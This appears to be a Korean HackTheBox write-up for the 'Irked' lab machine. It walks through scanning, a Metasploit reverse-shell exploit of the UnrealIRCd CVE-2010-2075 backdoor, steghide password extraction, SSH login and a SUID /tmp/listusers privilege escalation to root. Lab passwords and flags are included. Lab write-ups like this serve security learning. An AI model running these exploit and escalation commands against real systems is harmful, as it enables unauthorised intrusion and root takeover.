# HTB — Irked

**OS:** Linux (Debian) **Difficulty:** Easy **IP:** 10.129.192.227 **Tags:** `unrealircd` `backdoor` `steganography` `suid` `CVE-2010-2075`

---

## Summary

Irked는 UnrealIRCd 3.2.8.1의 백도어(CVE-2010-2075)를 이용해 초기 shell을 획득하고, 웹사이트 이미지에 steghide로 숨겨진 패스워드를 추출해 djmardov 유저로 lateral movement한다. 권한 상승은 커스텀 SUID 바이너리 `viewuser`가 `/tmp/listusers`를 root 권한으로 실행한다는 점을 이용한다.

---

## Reconnaissance

### Port Scan (전체)

```bash
nmap -p- --min-rate 5000 10.129.192.227
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u (UnrealIRCd)
8067/tcp  open  infi-async (UnrealIRCd)
37036/tcp open  unknown (RPC)
65534/tcp open  unknown (UnrealIRCd)
```

> 총 **6개** open (top 1000 기준: 3개 — 22, 80, 111)

### Version Scan

```bash
nmap -p 22,80,111,6697,8067,65534 -sV 10.129.192.227
```

- **UnrealIRCd** — 포트 6697, 8067, 65534
- Apache httpd 2.4.10

---

## Enumeration

### 웹서버 (포트 80)

`http://10.129.192.227` 접속 시 `irked.jpg` 이미지 존재 — 나중에 steghide에 사용.

---

## Exploitation

### UnrealIRCd 3.2.8.1 백도어 (CVE-2010-2075)

2010년 UnrealIRCd 3.2.8.1 소스코드에 악의적인 백도어가 삽입된 것이 발견됐다. `AB;` 로 시작하는 문자열을 전송하면 `;` 뒤의 명령어가 `system()`으로 실행된다.

**Metasploit:**

```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.129.192.227
set RPORT 6697
set PAYLOAD cmd/unix/reverse
set LHOST 10.10.17.240
run
```

`ircd` 유저 shell 획득.

---

## Lateral Movement (ircd → djmardov)

### .backup 파일 발견

```bash
cat /home/djmardov/Documents/.backup
# Super elite steg backup pw
# UPupDOWNdownLRlrBAbaSSss
```

### Steganography

`irked.jpg` 이미지에 steghide로 패스워드가 숨겨져 있음:

```bash
# Kali에서
wget http://10.129.192.227/irked.jpg
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
cat pass.txt
# Kab6h+m+bbp2J:HG
```

### SSH 접속

```bash
ssh djmardov@10.129.192.227
# password: Kab6h+m+bbp2J:HG
```

---

## User Flag

```bash
cat ~/user.txt
# fae22cf85198e7fd4337ab856e509423
```

---

## Privilege Escalation

### SUID 바이너리 탐색

```bash
find / -perm -4000 -type f 2>/dev/null
```

커스텀 SUID 바이너리 발견: `/usr/bin/viewuser`

### viewuser 분석

```bash
/usr/bin/viewuser
# /tmp/listusers: 파일 없음 에러
```

`viewuser`가 `/tmp/listusers`를 root 권한으로 실행하려 하지만 파일이 없어서 실패. `/tmp/listusers`를 직접 만들어서 악용:

```bash
echo 'bash' > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser
# root shell 획득
```

---

## Root Flag

```bash
cat /root/root.txt
# 0ccf357bcc6170baeca778d68cf19cb0
```

---

## Attack Chain

```
Port Scan
  → UnrealIRCd 3.2.8.1 (포트 6697)
    → CVE-2010-2075 백도어 → ircd shell
      → /home/djmardov/Documents/.backup → steghide pw
        → irked.jpg steghide 추출 → djmardov 패스워드
          → SSH (djmardov)
            → SUID viewuser → /tmp/listusers 생성
              → root shell
```

---

## Key Takeaways

- **UnrealIRCd 백도어**: IRC 서버 발견 시 버전 확인 필수. `AB;` 트리거로 인증 없이 RCE 가능. RPORT를 실제 서비스 포트(6697)로 맞춰야 함.
- **Steganography**: CTF/HTB에서 웹서버에 이미지가 있으면 steghide 시도. 패스워드 힌트는 주변 파일에서 찾을 것.
- **SUID 커스텀 바이너리**: `find / -perm -4000` 결과에서 시스템 기본 바이너리가 아닌 커스텀 바이너리를 집중 분석. 실행 시 참조하는 파일/경로가 write 가능하면 즉시 privesc 가능.
- **nmap top 1000 vs 전체**: 고포트(6697, 8067, 65534)는 기본 스캔에서 안 나옴. 항상 `-p-` 전체 스캔 필요.